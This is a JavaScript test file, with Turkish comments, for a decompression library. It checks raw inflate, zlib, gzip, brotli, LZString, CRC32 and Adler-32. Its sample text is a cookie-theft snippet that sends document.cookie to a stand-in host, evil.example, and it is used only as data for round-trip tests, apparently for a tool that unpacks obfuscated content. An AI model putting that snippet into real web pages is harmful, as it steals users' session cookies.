// Sıkıştırma çözücüleri: node test/compress.test.js
import assert from 'node:assert/strict';
import zlib from 'node:zlib';
import { inflateRaw, inflateZlib, gunzip, crc32, adler32 } from '../src/compress/inflate.js';
import { decompress, decompressAny, decompressSync, lzStringCandidates } from '../src/compress/index.js';
import { decompressFromBase64, decompressFromUTF16 } from '../src/compress/lzstring.js';
import { compressToBase64, compressToUTF16 } from './helpers/lzstring-compress.js';

const text = 'var payload = "https://evil.example/collect?c=" + document.cookie; '.repeat(40) + 'son';
const buf = Buffer.from(text);
const dec = (u8) => Buffer.from(u8).toString();

// saf JS inflate: Node zlib çıktılarıyla (sabit, dinamik ve saklı bloklar)
assert.equal(dec(inflateRaw(zlib.deflateRawSync(buf)).data), text);
assert.equal(dec(inflateRaw(zlib.deflateRawSync(buf, { level: 0 })).data), text);
assert.equal(dec(inflateRaw(zlib.deflateRawSync(Buffer.from('abc'), { strategy: zlib.constants.Z_FIXED })).data), 'abc');
assert.equal(dec(inflateZlib(zlib.deflateSync(buf))), text);
assert.equal(dec(gunzip(zlib.gzipSync(buf))), text);
assert.equal(dec(gunzip(Buffer.concat([zlib.gzipSync(Buffer.from('ab')), zlib.gzipSync(Buffer.from('cd'))]))), 'abcd');
assert.throws(() => inflateZlib(Buffer.from([0x78, 0x9c, 0xff, 0xff])));
assert.throws(() => inflateRaw(zlib.deflateRawSync(Buffer.alloc(1 << 16)), { maxOut: 1000 }), /sınır/);
assert.equal(crc32(Buffer.from('123456789')), 0xcbf43926);
assert.equal(adler32(Buffer.from('Wikipedia')), 0x11e60398);

// async yüzey: DecompressionStream (Node'da da var) ve brotli paketi
assert.equal(dec(await decompress(zlib.gzipSync(buf), 'gzip')), text);
assert.equal(dec(await decompress(zlib.deflateRawSync(buf), 'deflate-raw')), text);
assert.equal(dec(await decompress(zlib.brotliCompressSync(buf), 'brotli')), text);
assert.equal((await decompressAny(zlib.deflateSync(buf))).format, 'deflate');
assert.equal((await decompressAny(zlib.brotliCompressSync(buf))).format, 'brotli');
assert.equal(decompressSync(zlib.gzipSync(buf)).format, 'gzip');

// LZString: bağımsız sıkıştırıcı aktarımıyla gidiş-dönüş
assert.equal(decompressFromBase64(compressToBase64(text)), text);
assert.equal(decompressFromUTF16(compressToUTF16('merhaba dünya merhaba')), 'merhaba dünya merhaba');
assert.ok(lzStringCandidates(compressToBase64(text)).some((c) => c.format === 'lzstring-base64' && c.text === text));

console.log('compress: ok');
